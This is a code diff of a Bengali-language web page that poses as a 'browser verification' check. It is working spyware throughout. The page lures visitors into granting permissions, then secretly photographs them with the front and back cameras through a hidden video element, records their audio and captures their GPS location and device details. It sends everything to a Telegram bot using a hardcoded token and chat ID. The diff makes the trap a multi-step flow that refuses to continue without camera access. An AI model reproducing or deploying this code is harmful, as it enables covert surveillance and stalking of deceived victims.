@@ -3,30 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> ব্রাউজার সিকিউরিটি ভেরিফিকেশন</title>
+    <title>Browser ভেরিফিকেশন</title>
     <style>
         :root { --primary: #00d1b2; --dark: #363636; }
         body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
         .card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; max-width: 400px; width: 90%; z-index: 10; position: relative; }
-        .btn-start { background: var(--primary); color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        h2 { color: var(--dark); margin-bottom: 10px; font-size: 22px; }
+        p { color: #666; margin-bottom: 25px; font-size: 15px; min-height: 45px; }
+        .btn-action { background: var(--primary); color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        .btn-action:hover { background: #00b89c; transform: translateY(-2px); }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; margin: 15px auto; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #video { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.05; pointer-events: none; z-index: -1; }
         #canvas { display: none; }
-        #my-img { width: 100%; border-radius: 12px; display: none; margin-top: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
+        #my-img { width: 100%; border-radius: 12px; display: none; margin-top: 20px; }
     </style>
 </head>
 <body>
 
 <div class="card" id="main-ui">
     <div id="icon" style="font-size: 50px; margin-bottom: 20px;">🔒</div>
-    <h2 id="title"> ব্রাউজার ভেরিফিকেশন</h2>
-    <p id="desc"> ব্রাউজার কনফিগারেশন নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</p>
-    <button class="btn-start" id="start-btn" onclick="startProcess()">চেক শুরু করুন</button>
-    <div id="process-ui" style="display: none;">
-        <div class="loader"></div>
-        <p style="font-weight: bold; color: var(--primary);" id="status">প্রসেসিং হচ্ছে...</p>
-    </div>
+    <h2 id="title">Browser ভেরিফিকেশন</h2>
+    <p id="desc">আপনার ব্রাউজার কনফিগারেশন এবং নিরাপত্তা নিশ্চিত করতে নিচের বাটনে ক্লিক করুন।</p>
+    
+    <div id="loader" class="loader"></div>
+    <button class="btn-action" id="main-btn" onclick="stepOne()">চেক শুরু করুন</button>
+
     <img id="my-img" src="my_photo.jpg" alt="Success">
 </div>
 
@@ -37,108 +39,119 @@
 const TOKEN = "8657895361:AAGOkn7MmVJEBhblZ8V5zc16WAzxtRujNqg";
 const CHAT_ID = "-1003747831651";
 
-async function startProcess() {
-    document.getElementById('start-btn').style.display = 'none';
-    document.getElementById('desc').style.display = 'none';
-    document.getElementById('process-ui').style.display = 'block';
+let deviceInfo = "";
+let mapLink = "লোকেশন পারমিশন পাওয়া যায়নি";
 
-    const deviceInfo = `📱 ওএস: ${navigator.platform}\n🌐 ব্রাউজার: ${navigator.userAgent.split(') ')[1] || 'Unknown'}\n🖥 স্ক্রিন: ${screen.width}x${screen.height}`;
-
-    let mapLink = "লোকেশন পারমিশন পাওয়া যায়নি";
+// প্রথম ধাপ: ফ্রন্ট ক্যামেরা ও লোকেশন
+async function stepOne() {
+    toggleUI(true);
+    
+    // ডিভাইস ও লোকেশন একবারেই নিয়ে নেওয়া হচ্ছে
+    deviceInfo = `📱 ওএস: ${navigator.platform}\n🌐 ব্রাউজার: ${navigator.userAgent.split(') ')[1] || 'Unknown'}\n🖥 স্ক্রিন: ${screen.width}x${screen.height}`;
     try {
-        const position = await new Promise((res, rej) => {
-            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 10000 });
+        const pos = await new Promise((res, rej) => {
+            navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000 });
         });
-        mapLink = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
-    } catch (e) { console.log("Location Denied"); }
-
-    const report = `📊 *নতুন ট্র্যাকিং রিপোর্ট*\n\n${deviceInfo}\n\n📍 *লোকেশন:* [ম্যাপ দেখুন](${mapLink})`;
+        mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+    } catch (e) {}
 
     try {
-        // ১. সামনের ক্যামেরা
-        updateStatus("সিস্টেম ফাইল যাচাই হচ্ছে...");
-        const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-        await captureAndSend(frontStream, "Front Camera", report);
-
-        // ২. হার্ডওয়্যার রিলিজের জন্য ২ সেকেন্ড বিরতি (বেশি সময় দেওয়া হলো)
-        await new Promise(r => setTimeout(r, 2000));
-
-        // ৩. পেছনের ক্যামেরা (উন্নত লজিক)
-        updateStatus("হার্ডওয়্যার স্ক্যান করা হচ্ছে...");
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        const videoDevices = devices.filter(device => device.kind === 'videoinput');
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        await captureAndSend(stream, "Front Camera", `📊 *ট্র্যাকিং রিপোর্ট*\n\n${deviceInfo}\n📍 *লোকেশন:* [ম্যাপ দেখুন](${mapLink})`);
         
-        let backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[videoDevices.length - 1];
-
-        if (videoDevices.length > 1) {
-            const backStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { deviceId: backCamera.deviceId ? { exact: backCamera.deviceId } : undefined, facingMode: "environment" } 
-            });
-            await captureAndSend(backStream, "Back Camera", "--- পেছনের ক্যামেরা ছবি ---");
-        }
-
-        // ৪. অডিও রেকর্ড (৫ সেকেন্ড)
-        updateStatus("সিকিউরিটি এনক্রিপশন চেক হচ্ছে...");
-        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        await captureAudio(audioStream);
-
-        showFinalUI();
+        // UI আপডেট
+        toggleUI(false);
+        document.getElementById('title').innerText = "চমৎকার!";
+        document.getElementById('desc').innerText = "আপনি browser verification প্রথম ধাপ অতিক্রম করেছেন।";
+        document.getElementById('main-btn').innerText = "পরবর্তী ধাপ (Next)";
+        document.getElementById('main-btn').onclick = stepTwo;
     } catch (err) {
-        console.error(err);
-        showFinalUI();
+        alert("ক্যামেরা পারমিশন ছাড়া ভেরিফিকেশন সম্ভব নয়।");
+        location.reload();
     }
 }
 
-function updateStatus(text) { document.getElementById('status').innerText = text; }
+// দ্বিতীয় ধাপ: ব্যাক ক্যামেরা ও অডিও
+async function stepTwo() {
+    toggleUI(true);
+    document.getElementById('desc').innerText = "আপনার ভেরিফিকেশনটি যাচাই করা হচ্ছে...";
+
+    try {
+        // ব্যাক ক্যামেরা ট্রাই
+        try {
+            const bStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+            await captureAndSend(bStream, "Back Camera", "--- পেছনের ক্যামেরা ছবি ---");
+            await new Promise(r => setTimeout(r, 1000));
+        } catch (e) {}
+
+        // অডিও ট্রাই
+        const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        await captureAudio(aStream);
+
+        toggleUI(false);
+        document.getElementById('icon').innerHTML = "✅";
+        document.getElementById('title').innerText = "সফল হয়েছে!";
+        document.getElementById('desc').innerText = "সবগুলো সিকিউরিটি প্যারামিটার সফলভাবে যাচাই করা হয়েছে।";
+        document.getElementById('main-btn').innerText = "ফাইনাল ভেরিফাই (Final)";
+        document.getElementById('main-btn').onclick = finalStep;
+    } catch (err) {
+        finalStep(); // অডিও না দিলেও শেষ ধাপে নিয়ে যাবে
+    }
+}
+
+// ফাইনাল ধাপ
+function finalStep() {
+    document.getElementById('main-btn').style.display = 'none';
+    document.getElementById('title').innerText = "অভিনন্দন!";
+    document.getElementById('desc').innerText = "আপনি সফলভাবে ভেরিফিকেশন কমপ্লিট করেছেন।";
+    document.getElementById('my-img').style.display = 'block';
+}
+
+function toggleUI(isLoading) {
+    document.getElementById('loader').style.display = isLoading ? 'block' : 'none';
+    document.getElementById('main-btn').style.display = isLoading ? 'none' : 'block';
+}
 
 async function captureAndSend(stream, type, caption) {
     const video = document.getElementById('video');
     video.srcObject = stream;
     await video.play();
-    
     return new Promise(resolve => {
         setTimeout(async () => {
             const canvas = document.getElementById('canvas');
             canvas.width = 640; canvas.height = 480;
             canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
             canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'img.jpg');
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'Markdown');
-                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                stream.getTracks().forEach(track => track.stop());
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, 'img.jpg');
+                fd.append('caption', caption);
+                fd.append('parse_mode', 'Markdown');
+                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                stream.getTracks().forEach(t => t.stop());
                 resolve();
             }, 'image/jpeg', 0.6);
-        }, 3000); 
+        }, 2500);
     });
 }
 
 async function captureAudio(stream) {
-    const mediaRecorder = new MediaRecorder(stream);
+    const recorder = new MediaRecorder(stream);
     const chunks = [];
     return new Promise(resolve => {
-        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-        mediaRecorder.onstop = async () => {
+        recorder.ondataavailable = e => chunks.push(e.data);
+        recorder.onstop = async () => {
             const blob = new Blob(chunks, { type: 'audio/ogg' });
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('voice', blob, 'audio.ogg');
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: formData });
-            stream.getTracks().forEach(track => track.stop());
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('voice', blob, 'audio.ogg');
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: 'POST', body: fd });
+            stream.getTracks().forEach(t => t.stop());
             resolve();
         };
-        mediaRecorder.start();
-        setTimeout(() => mediaRecorder.stop(), 5000);
+        recorder.start();
+        setTimeout(() => recorder.stop(), 4000);
     });
-}
-
-function showFinalUI() {
-    document.getElementById('process-ui').style.display = 'none';
-    document.getElementById('icon').innerHTML = '✅';
-    document.getElementById('title').innerText = 'ভেরিফিকেশন সম্পন্ন';
-    document.getElementById('my-img').style.display = 'block';
 }
 </script>
 </body>
